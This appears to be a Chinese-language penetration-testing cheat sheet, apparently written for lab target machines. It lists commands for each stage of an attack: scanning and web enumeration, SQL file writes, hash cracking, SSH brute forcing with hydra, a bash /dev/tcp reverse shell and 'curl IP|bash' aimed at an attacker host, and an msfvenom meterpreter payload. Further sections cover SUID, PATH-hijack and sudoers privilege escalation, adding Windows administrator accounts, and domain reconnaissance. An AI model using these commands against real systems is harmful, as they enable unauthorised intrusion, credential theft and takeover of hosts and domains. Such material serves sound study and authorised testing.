# 主机发现阶段

`arp-scan --interface=eth0 -l | grep *`

指定接口扫描 换成IP可以指定网段

`nmap -sV -p- -sT -sC  ip`

扫描靶机的版本基本漏洞扫描 使用 `--script=vuln` 可以扫描漏洞，使用 `--min-rate` 指定速率

# web探索阶段

`dirb +http:// ip` 

扫描网站目录 `-w` 可以指定字典

在一定的探索基础上可以使用wpscan 扫描wrodpress的cms的网站信息

`wpscan --url=http://ip --ignore-main-redirect --force  -e --plugins-detection aggressive`

数据库连接

`mysql -h ip -D database-u seeddms -p seeddms`

数据库注入

`system cmd`

`select cmd into outfile 路径`

`update tablename set columnname ="content" where columnname=""`

md5破解和计算

`echo -n ""|md5sum`

`hashcat -a 0 -m 0 hashValue /usr/share/wordlists/rockyou.txt`

`hydra -L userList -P passwordList ssh://ip -V`

samba枚举

`enum4linux ip`

# Getshell阶段

file_upload&RCE

反弹shell

前置知识

| command > file  | 将输出重定向到 file。                              |
| --------------- | -------------------------------------------------- |
| command < file  | 将输入重定向到 file。                              |
| command >> file | 将输出以追加的方式重定向到 file。                  |
| n > file        | 将文件描述符为 n 的文件重定向到 file。             |
| n >> file       | 将文件描述符为 n 的文件以追加的方式重定向到 file。 |
| n >& m          | 将输出文件 m 和 n 合并。                           |
| n <& m          | 将输入文件 m 和 n 合并。                           |
| << tag          | 将开始标记 tag 和结束标记 tag 之间的内容作为输入。 |

> *需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）*

`bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1`

`curl IP|bash`(需要80开放)

`msfvenom -l payloads | grep 'cmd/unix/reverse'`

ssh登录

`ssh [-l login_name] [-p port] [user@]hostname`

# 提权

传输文件：

nc：

靶机上监听端口: `nv -lnvp 4545(port) > 123.c`

kali上传文件: `nc 192.168.88.* 4545(port) < 123.c -w 1`

利用nc将kali的文件上传到靶机，这里靶机监听端口将文件写入123.c。kali这里ip为靶机ip 然后将123.c上传过去

`python -m http.server 8080` 

`php -S 0:80 `

`searchsploit * -m *`

`sudo -l` 列出权限

sudo -i 提权

SUID提权：

> 具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限

```shell
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

查找特权命令

`find pentestlab -exec whoami \;`

`vim bash less more`

`awk 'BEGIN {system("/bin/bash")}'`

`man passwd !/bin/bash`

环境变量+SUID

```
cd /tmp
echo “/bin/sh” > ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell
```

绕过被限制的shell

```
BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`
export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出
export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出
```



`echo "username ALL=(ALL:ALL) ALL" | sudo cmd -a /etc/sudoers`

内核提权：

`脏牛 影响范围：Linux内核>=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。`

`cat /etc/crontab`

[Linux配置错误提权之利用/etc/passwd](https://blog.csdn.net/qq_44159028/article/details/121078898)

```
net user 账户 密码 /add
管理员权限，所有直接加
net localgroup administrators admin /add
```

# 木马注入

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=5555 -a x86 --platform Windows -f exe > shell.exe`


# 信息收集
```shell
 ipconfig /all   # 查看本机ip，所在域
 route print     # 打印路由信息
 net view        # 查看局域网内其他主机名
 arp -a          # 查看arp缓存
 net start       # 查看开启了哪些服务
 net share       # 查看开启了哪些共享
 net share ipc$  # 开启ipc共享
 net share c$    # 开启c盘共享
 net use \\192.168.xx.xx\ipc$ "" /user:""    # 与192.168.xx.xx建立空连接
 net use \\192.168.xx.xx\c$ "密码" /user:"用户名"    # 建立c盘共享
 dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件
 
 net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
 net user                 # 查看本机用户列表
 net user /domain         # 查看域用户
 net localgroup administrators    # 查看本地管理员组（通常会有域用户）
 net view /domain         # 查看有几个域
 net user 用户名 /domain   # 获取指定域用户的信息
 net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
 net group 组名 /domain    # 查看域中某工作组
 net group "domain admins" /domain  # 查看域管理员的名字
 net group "domain computers" /domain  # 查看域中的其他主机名
 net group "doamin controllers" /domain  # 查看域控制器（可能有多台）
```